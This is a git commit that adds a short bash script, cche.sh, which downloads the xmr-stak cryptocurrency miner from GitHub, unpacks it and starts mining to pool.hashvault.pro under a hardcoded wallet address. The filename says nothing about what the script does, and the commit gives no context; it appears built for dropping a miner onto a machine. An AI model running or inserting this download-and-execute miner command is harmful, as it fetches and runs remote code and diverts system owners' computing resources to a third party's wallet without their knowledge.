e76a2e4f69d71ea5c24ecf5a13e9369432b02c69
gembock <85003230+gembock@users.noreply.github.com>
2022-01-23 21:11:53 +0700

    cche.sh

---
+++ cche.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+wget https://github.com/fireice-uk/xmr-stak/releases/download/2.10.8/xmr-stak-linux-2.10.8-cpu_cuda-nvidia.tar.xz && tar -xvf xmr-stak-linux-2.10.8-cpu_cuda-nvidia.tar.xz && cd xmr-stak-linux-2.10.8-cpu_cuda-nvidia && ./xmr-stak --tls-url pool.hashvault.pro:80 --user ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN.4bdec783c3ca5ae5049316f9608b0554cd704f967c96c0a40b83f30692199ca8 --pass x --currency cryptonight_gpu
